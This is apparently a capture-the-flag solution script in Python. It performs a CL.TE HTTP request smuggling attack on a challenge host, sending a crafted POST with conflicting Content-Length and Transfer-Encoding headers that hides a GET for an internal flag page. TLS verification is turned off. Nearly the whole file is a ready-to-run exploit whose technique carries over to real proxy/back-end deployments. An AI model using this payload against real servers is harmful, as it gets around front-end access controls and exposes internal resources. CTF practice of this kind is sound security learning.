import socket
import ssl

HOST = "welcome-aboard-ca3581b285069ede-global.challs.brunnerne.xyz"   # replace with actual host
PORT = 1337              
USE_TLS = True
PATH = "/search"

def send_raw(payload, read_timeout=5):
    s = socket.create_connection((HOST, PORT), timeout=10)
    if USE_TLS:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=HOST)

    s.sendall(payload)
    s.settimeout(read_timeout)
    resp = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
    except socket.timeout:
        pass
    s.close()
    return resp

def build_clte(smuggled_req):
    # Front-end trusts Content-Length, back-end trusts Transfer-Encoding.
    # Front-end forwards the whole body as one request (based on CL),
    # back-end reads chunked and stops early, leaving the rest as the
    # start of the "next" request it processes.
    body = f"0\r\n\r\n{smuggled_req}"
    cl = len(body)
    req = (
        f"POST {PATH} HTTP/1.1\r\n"
        f"Host: {HOST}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{body}"
    ).encode()
    return req

smuggled = (
    "GET /wiki/internal/flag HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "\r\n"
)

if __name__ == "__main__":
    payload = build_clte(smuggled)
    print("---- RAW REQUEST SENT ----")
    print(payload.decode(errors="replace"))
    print("---- RAW RESPONSE ----")
    r = send_raw(payload)
    print(r.decode(errors="replace"))